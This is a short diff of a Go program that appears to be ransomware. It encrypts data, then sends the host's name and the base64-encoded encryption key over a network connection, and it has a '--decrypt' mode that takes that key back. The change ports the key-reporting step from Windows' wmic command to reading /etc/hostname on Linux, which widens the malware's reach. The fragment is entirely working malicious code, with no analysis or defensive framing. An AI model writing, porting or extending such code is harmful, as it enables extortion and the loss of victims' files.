@@ -105,15 +105,9 @@ func main() {
 			return
 		}
 		wgc.Wait()
-		name := ""
-		output, _ := exec.Command("wmic", "computersystem", "get", "name").Output()
-		for _, letter := range string(output)[4:] {
-			if letter != 32 && letter != 13 && letter != 10 {
-				name += string(letter)
-			}
-		}
-		fmt.Fprintf(c, name+"|"+base64.StdEncoding.EncodeToString(CryptKey))
-
+		cmd := exec.Command("cat", "/etc/hostname")
+		output, _ := cmd.CombinedOutput()
+		fmt.Fprintf(c, string(output)[:len(string(output))-1]+"|"+base64.StdEncoding.EncodeToString(CryptKey))
 	} else if len(args) == 2 && args[0] == "--decrypt" {
 		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
 		for i := 0; i < 100; i++ {
